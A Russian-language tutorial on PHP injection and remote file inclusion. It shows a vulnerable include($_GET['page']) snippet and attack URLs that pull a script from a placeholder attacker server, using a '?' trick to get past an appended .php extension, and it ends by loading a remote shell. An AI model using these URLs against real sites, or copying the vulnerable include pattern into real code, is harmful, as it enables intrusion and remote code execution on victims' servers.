# PHP-injection

PHP-инъекция - это атака на сайт, которая происходит за счет внедрения php кода в атакуемое php-приложение.

```
eval()
preg_replace() (с модификатором «e»)
require_once()
include_once()
include()
require()
create_function()
```
- Потенциально опасные функции

Разберем на примере функции include(), которая подключает внешний файл с кодом php.

Представим, что у нас имеется сайт, написанный на PHP. Представим так же, что сайт использует команду page=page.html для отображения запрашиваемой страницы. Код будет выглядеть так:

```php
<?php
$file = $_GET [ "page" ];
include($file );
?>
```

Это значит, что все, выводимое на странице, будет внедрено в пхп-код этой страницы. Следовательно атакующий может проделать что-то наподобии:

`http : //www.атакуемый_сайт.com/index.php?page=http://www.атакующий_серв.com/вредоносный_скрипт.txt?`

Если посмотреть, что происходит после выполнения include, нам представится следующий код, выполненный на целевом сервере:

```php
<?php
$file = "http://www.атакующий_серв.com/вредоносный_скрипт.txt?" ; //$_GET["page"];
include($file ); //$file - это внедренный злоумышленником скрипт
?>
```

Мы видим, что злоумышленник произвел успешную атаку на целевой сервер.

Немного подробнее:

Почему в примере был указан скрипт с расширением .txt , а не .php ? Ответ прост, если бы скрипт имел формат .php , он бы запустился на сервере злоумышленника, а не на целевой системе.

Зачем добавлен символ “?” в пути к внедряемому скрипту? Чтобы убрать что-либо, находящееся внутри функции include() на целевом сервере

```php
$file = $_GET [ "page" ];
include($file . ".php" );
?>
```

Этот скрипт добавляет расширение .php к чему либо, вызываемому командой include() . Т.е.

`http : //www.атакующий_серв.com/вредоносный_скрипт.txt`

Превращается в

`http : //www.атакующий_серв.com/вредоносный_скрипт.txt.php`

С таким именем скрипт не запустится (на сервере злоумышленника не существует фала /вредоносный_скрипт.txt.php ) По этому, мы и добавляем "?" в конец пути к вредоносному скрипту:

`http : //www.атакующий_серв.com/вредоносный_скрипт.txt?.php`

Но он остается исполняемым.

## RFI

Уязвимость типа PHP-injection позволяет проводить несколько других атак, например RFI (Remote File Inlcude) или “Удаленное подключение файлов”.

Допустим мы случайно набрели на страницу, в адресной строке браузера заканчивающуюся подобным образом: `/ index . php ? page = main`

Подставляем вместо main любое бредовое значение, например abcd

`/ index . php ? page = abcd`

В ответ получим ошибку:

`Warning : main (abcd . php ): failed to open stream : No such file or directory in / home / user / www [//page.php](<https://page.php/>) on line 3`

`Warning : main (abcd . php ): failed to open stream : No such file or directory in / home / user / www / page . php on line 3`

`Warning : main (): Failed opening "abcd.php" for inclusion (include_path = ".:/usr/lib/php:/usr/local/lib/php:/usr/local/share/pear" ) in / home / user / www / page . php on line 3`

Это показывает нам на то, что инклуд осуществим. Пробуем подставить вместо `abcd` сайт с путем до шелла (расширения файла шелла не должно указываться, или указывать его, как было описано выше)

`http : //www.атакуемый_сервер.com/index.php?file=http://www.сайт_злоумышленника.com/shell`

Таким образом получен шелл.